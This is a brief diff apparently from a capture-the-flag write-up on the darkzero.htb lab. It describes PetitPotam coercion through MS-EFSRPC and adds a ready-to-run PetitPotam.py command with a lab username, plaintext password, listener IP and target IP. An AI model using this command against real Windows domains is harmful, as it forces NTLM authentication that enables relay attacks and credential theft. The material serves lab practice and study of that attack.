@@ -4,3 +4,9 @@ authenticate against another host using NTLM over port 445 via the Local Securit
 Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol
 (MS-EFSRPC).
 
+```bash
+python3 PetitPotam.py -pipe all -u john.w -p 'RFulUtONCOL!' -d darkzero.htb 10.10.16.39 10.10.11.89
+
+# 10.10.16.39 -> listner
+# 10.10.11.89 -> target
+```
